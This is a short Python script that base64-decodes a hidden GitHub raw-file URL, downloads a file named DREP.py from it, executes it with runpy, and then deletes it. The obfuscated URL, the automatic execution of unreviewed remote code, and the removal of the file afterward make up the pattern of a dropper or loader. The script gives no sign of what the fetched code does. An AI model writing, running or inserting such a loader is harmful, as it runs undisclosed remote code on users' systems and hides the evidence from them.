import requests
import runpy
import os
import base64

def download_file_from_github(url, local_filename):
    try:
        response = requests.get(url)
        response.raise_for_status()  # Check if the request was successful
        with open(local_filename, 'wb') as file:
            file.write(response.content)
        print(f"Downloaded {local_filename} successfully.")
    except requests.exceptions.RequestException as e:
        print(f"An error occurred while downloading the file: {e}")
        return None
    return local_filename

def run_python_file(file_path):
    try:
        runpy.run_path(file_path)
    except FileNotFoundError:
        print(f"The file at path {file_path} was not found.")
    except Exception as e:
        print(f"An error occurred: {e}")

encoded_github_url = 'aHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL1NBQkEtU0lEL0RSRVAvbWFpbi9EUkVQLnB5'

github_url = base64.b64decode(encoded_github_url).decode()
local_filename = 'DREP.py'


file_path = download_file_from_github(github_url, local_filename)


if file_path:
    run_python_file(file_path)


if os.path.exists(local_filename):
    os.remove(local_filename)
    print(f"Removed {local_filename} after execution.")
